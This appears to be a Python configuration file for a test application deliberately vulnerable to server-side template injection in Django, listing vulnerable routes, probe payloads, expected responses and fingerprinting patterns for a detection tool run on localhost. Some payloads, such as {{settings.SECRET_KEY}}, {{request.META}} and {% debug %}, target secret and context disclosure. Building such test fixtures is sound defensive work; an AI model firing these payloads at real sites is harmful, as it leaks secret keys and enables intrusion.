"""
Route configuration for Django Templates SSTI test application.
"""

# URL patterns for testing
VULNERABLE_ROUTES = {
    'search': {
        'url': '/search',
        'methods': ['GET'],
        'parameters': ['q'],
        'vulnerability_type': 'reflected_parameter',
        'payload_location': 'query_parameter',
        'confidence': 'high',
        'description': 'Search query parameter processed through Django template filters'
    },
    
    'profile_form': {
        'url': '/profile',
        'methods': ['GET', 'POST'],
        'parameters': ['name', 'bio', 'signature'],
        'vulnerability_type': 'form_input',
        'payload_location': 'form_data',
        'confidence': 'high',
        'description': 'Form data rendered through Django templates'
    },
    
    'direct_render': {
        'url': '/render',
        'methods': ['GET'],
        'parameters': ['content', 'type'],
        'vulnerability_type': 'template_injection',
        'payload_location': 'query_parameter',
        'confidence': 'high',
        'description': 'Direct template string construction with user input'
    },
    
    'debug_page': {
        'url': '/debug',
        'methods': ['GET'],
        'parameters': ['info', 'level'],
        'vulnerability_type': 'debug_information',
        'payload_location': 'query_parameter',
        'confidence': 'high',
        'description': 'Debug page with template rendering and settings access'
    },
    
    'api_data': {
        'url': '/api/data',
        'methods': ['GET'],
        'parameters': ['query', 'format'],
        'vulnerability_type': 'api_response',
        'payload_location': 'query_parameter',
        'confidence': 'medium',
        'description': 'API endpoint with template processing'
    },
    
    'filter_test': {
        'url': '/filter',
        'methods': ['GET'],
        'parameters': ['value', 'filter'],
        'vulnerability_type': 'filter_injection',
        'payload_location': 'query_parameter',
        'confidence': 'high',
        'description': 'Dynamic Django filter application'
    },
    
    'template_inclusion': {
        'url': '/include',
        'methods': ['GET'],
        'parameters': ['template', 'data'],
        'vulnerability_type': 'template_inclusion',
        'payload_location': 'query_parameter',
        'confidence': 'medium',
        'description': 'Dynamic template inclusion vulnerability'
    },
    
    'settings_access': {
        'url': '/settings',
        'methods': ['GET'],
        'parameters': ['key'],
        'vulnerability_type': 'settings_disclosure',
        'payload_location': 'query_parameter',
        'confidence': 'high',
        'description': 'Django settings access through templates'
    },
    
    'custom_context': {
        'url': '/context',
        'methods': ['GET'],
        'parameters': ['input'],
        'vulnerability_type': 'context_injection',
        'payload_location': 'query_parameter',
        'confidence': 'high',
        'description': 'Custom context processors with debug information'
    }
}

# Safe routes
SAFE_ROUTES = {
    'index': {
        'url': '/',
        'methods': ['GET'],
        'description': 'Main index page - static content'
    }
}

# Test payloads specific to Django Templates
DJANGO_TEST_PAYLOADS = {
    'add_filter': {
        'payload': '{{7|add:"7"}}',
        'expected_response': '14',
        'confidence': 'high',
        'description': 'Mathematical operation using add filter'
    },
    
    'debug_tag': {
        'payload': '{% debug %}',
        'expected_response': 'DEBUG',
        'confidence': 'high',
        'description': 'Debug tag revealing template context'
    },
    
    'settings_access': {
        'payload': '{{settings.SECRET_KEY}}',
        'expected_response': 'test_secret_key',
        'confidence': 'high',
        'description': 'Django settings access'
    },
    
    'settings_debug': {
        'payload': '{{settings.DEBUG}}',
        'expected_response': 'True',
        'confidence': 'high',
        'description': 'Debug setting access'
    },
    
    'request_meta': {
        'payload': '{{request.META}}',
        'expected_response': 'HTTP_',
        'confidence': 'high',
        'description': 'Request metadata access'
    },
    
    'request_method': {
        'payload': '{{request.method}}',
        'expected_response': 'GET',
        'confidence': 'medium',
        'description': 'HTTP method access'
    },
    
    'request_path': {
        'payload': '{{request.path}}',
        'expected_response': '/',
        'confidence': 'medium',
        'description': 'Request path access'
    },
    
    'user_object': {
        'payload': '{{user}}',
        'expected_response': 'AnonymousUser',
        'confidence': 'medium',
        'description': 'User object access'
    },
    
    'now_tag': {
        'payload': '{% now "Y-m-d" %}',
        'expected_response': '20',
        'confidence': 'medium',
        'description': 'Current date/time tag'
    },
    
    'length_filter': {
        'payload': '{{"test"|length}}',
        'expected_response': '4',
        'confidence': 'medium',
        'description': 'String length filter'
    },
    
    'upper_filter': {
        'payload': '{{"test"|upper}}',
        'expected_response': 'TEST',
        'confidence': 'medium',
        'description': 'String uppercase filter'
    },
    
    'capfirst_filter': {
        'payload': '{{"test"|capfirst}}',
        'expected_response': 'Test',
        'confidence': 'medium',
        'description': 'Capitalize first letter filter'
    }
}

# Context-specific payloads for Django
CONTEXT_PAYLOADS = {
    'html_context': [
        '{{7|add:"7"}}',
        '{% debug %}',
        '{{settings.SECRET_KEY}}'
    ],
    
    'url_parameter': [
        '%7B%7B7%7Cadd%3A%227%22%7D%7D',  # URL encoded {{7|add:"7"}}
        '{{7|add:"7"}}',
        '{{settings.DEBUG}}'
    ],
    
    'form_data': [
        '{{7|add:"7"}}',
        '{% debug %}',
        '{{request.META}}'
    ],
    
    'json_context': [
        '{{7|add:"7"}}',
        '{{settings.SECRET_KEY}}'
    ]
}

# Expected error patterns for Django
DJANGO_ERROR_PATTERNS = [
    'TemplateSyntaxError',
    'TemplateDoesNotExist',
    'VariableDoesNotExist',
    'django.template.exceptions',
    'Invalid filter',
    'Invalid block tag'
]

# Django-specific indicators
DJANGO_INDICATORS = [
    'django',
    'Django/',
    'DEBUG = True',
    'AnonymousUser',
    'csrf_token',
    'DJANGO_SETTINGS_MODULE'
]

# Test configuration
TEST_CONFIG = {
    'app_name': 'django_templates',
    'host': 'localhost',
    'port': 8000,
    'base_url': 'http://localhost:8000',
    'startup_timeout': 15,
    'request_timeout': 5,
    'expected_engine': 'django',
    'framework': 'django',
    'language': 'python'
}
